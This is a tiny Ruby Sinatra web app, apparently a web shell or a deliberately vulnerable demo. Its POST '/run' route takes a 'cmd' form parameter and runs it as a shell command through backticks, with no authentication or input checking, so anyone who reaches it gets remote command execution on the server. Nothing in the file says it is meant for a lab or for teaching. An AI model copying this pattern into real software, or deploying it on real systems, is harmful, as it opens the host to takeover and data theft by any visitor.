require 'sinatra'

get '/' do
  erb :form
end

post '/run' do
  `#{params[:cmd]}`

  redirect to('/')
end
